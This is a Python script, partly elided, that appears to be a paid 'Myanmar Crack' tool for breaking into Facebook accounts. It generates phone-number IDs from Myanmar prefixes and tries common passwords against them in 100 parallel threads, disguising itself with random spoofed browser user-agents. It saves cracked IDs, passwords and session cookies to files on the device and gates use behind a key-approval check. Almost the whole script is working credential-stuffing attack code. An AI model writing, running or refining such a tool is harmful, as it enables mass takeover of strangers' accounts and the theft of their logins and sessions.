import random, requests , re , sys , os , time , socket 
...
def ua_new():
    ...
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36 Edg/122.0.2365.66"
    return xx
   
def ua_validate():
	android = random.choice(['10.0','9.0','12.0','13','14'])
	#bd = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
	build = "SP1A."+str(random.randint(111111,199999))+".016"
	...
	return ('Mozilla/5.0 (Linux; U; Android {}; Redmi Build/{}.) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{}'.format(android, build, chrome, browser))
...
def windows_ua():
    ...
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/528..{aV} (KHTML, like Gecko) Version/4{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/528.{aV}"
    ...
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
...
def main():
    ...
    print(logo)
    clear()
    print(f"\033[1;37m[√] TODAY DATE & TIME : \033[1;32m{day}/{month}/{year} & \033[1;32m"+str(x)+":"+str(lt()[4])+" "+ tag+" ")
    print(f"\033[1;37m[√] YOUR IP :\033[1;35m {ip}")
    print(f"\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
    print(f"\033[1;37m[√] TOOL OWNER   :\033[1;32m  ✌𝓚𝓞 𝓑𝓞 𝓣𝓗𝓔𝓣✌") 
    print(f"\033[1;37m[√] TOOL TYPE    :\033[1;32m PAID") 
    print(f"\033[1;37m[√] TOOL VERSION :\033[1;32m 1.0v ")
    print(f"\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
    print("\033[1;32m[\033[1;97m1\033[1;97m] \033[1;97mMyanmar Crack")
    
    print("\033[1;32m[\033[1;97m0\033[1;37m] \033[1;97mEXIT                     ")
    linex()
    ZWE = input(f'\033[1;32m[\033[1;97m✓\033[1;32m] \033[1;97mInput \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    ...
    os.system('clear')
    print(logo)
    print("\033[1;32m[\033[1;97m✔\033[1;32m]\033[1;97m EXAMPLE : 88 ✓ 66 ✓ 77 ")
    linex()
    code = input('\033[1;32m[\033[1;97m✓\033[1;32m]\033[1;97m INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[1;32m[\033[1;97m✔\033[1;32m]\033[1;97mInput : 3000 , 5000 , 10000")
    linex()
    ...
    with ThreadPool(max_workers=100) as LEE:
        ...
        print(f"\033[1;37m[√] YOUR IP :\033[1;35m {ip}")
        print(f"\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
        print(f"\033[1;37m[√] TOOL OWNER   :\033[1;32m ✌Ko Bo Thet✌") 
        print(f"\033[1;37m[√] TOOL TYPE    :\033[1;32m PAID") 
        print(f"\033[1;37m[√] TOOL VERSION :\033[1;32m 1.0v ")
        print(f"\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
        tl = str(len(user))
        print(f'\033[1;37m[✓] TOTAL ID      \033[1;32m✓ \033[1;32m'+tl+'  ')
        print(f'\033[1;37m[✓] Target Sim CODE \033[1;32m✓ \033[1;32m'+code+'             ')
        print(f"\033[1;37m[✓] Wait For OK ID 💚")
        print(f"\033[1;37m[✓] This Process is background in running !!")
        linex()
        for love in user:
            uid = '09'+code+love
            pwx = [code+love,love,code+love[4:],love[5:],'myanmar123','kyawkyaw','aungaung','saisai']
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\r \033[1;32m[%s{uid}\033[1;32m]\033[1;34m\033[1;32m[\033[38;5;195m%s/%s\033[1;32m][\033[1;32mOK-%s/\033[1;31mCP-\033[1;35m%s\033[1;32m]\r'%(bi,loop,tl,len(oks),len(cps))),            
            sys.stdout.flush()
            ...
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.", "Microsoft Edge";v="120.0."',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[1;32m[FB ID]-----> \033[1;35m{uid} \n[FB Password]----->  \033[1;34m{ps}" '  \n\033[1;97m[COOKIE-🍪]------> \033[1;37m'+coki+  '')
                linex()
                open('/sdcard/PRO-OK.txt', 'a').write( uid+' | '+ps+'\nCookie = '+coki+'\n\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[82:97]
                #print(f"\033[1;37m [PRO-CP] \033[1;35m{uid} ♥️ {ps}")
                linex()
                #print(f"\x1b[1;90m❮COOKIE❯ {coki} ")
                open('/sdcard/PRO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
...
\033[1;32m    (  ____ )   (  ____ )   (  ___  )
\033[1;33m    | (    )|   | (    )|   | (   ) |
\033[1;34m    | (____)|   | (____)|   | |   | |
\033[1;35m    |  _____)   |     __)   | |   | |
\033[1;36m    | (         | (\ (      | |   | |
\033[1;37m    | )         | ) \ \__   | (___) |
\033[1;30m    |/          |/   \__/   (_______)  [\033[1;32mV\033[1;30m].[\033[1;32mI\033[1;30m].[\033[1;32mP\033[1;30m]
...
def menu_apikey():
  ...
  id = "-".join(uuid)
  server = requests.get('https://github.com/Painggyi404/Random/blob/main/Pro-Rd-Approve.txt').text
  #os.system("clear")
  #os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
  os.system('clear')              
  print (""" 
...
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
  ...
  print('\033[1;92m╚══════════════════════════════════════╝')
  try:
    httpCaht = requests.get("https://github.com/Painggyi404/Random/blob/main/Pro-Rd-Approve.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://m.me/upaing.gyi.1441?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
menu_apikey()
os.system(" clear")
print(' \033[1;32mloading Update V1\033[1;33m......'); time.sleep(2)
os.system(" clear")
print(' \033[1;32m  PRO Tool Is Login\033[1;33m....')
os.system(" clear")
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.001)
sys.stdout.write('\x1b[1;35m\x1b]2; Pro [V.I.P]\x07')
...
while key == 'true':
    ...
    if username == CorrectUsername:
            print(f'\033[1;93m ╚══════════════════════════════════════╝\n\033[0;97m[•]\033[1;32m LOGGED IN Random Clone TOOL SUCCESSFULLY') 
            time.sleep(1)
            os.system('clear')
            key = 'false'
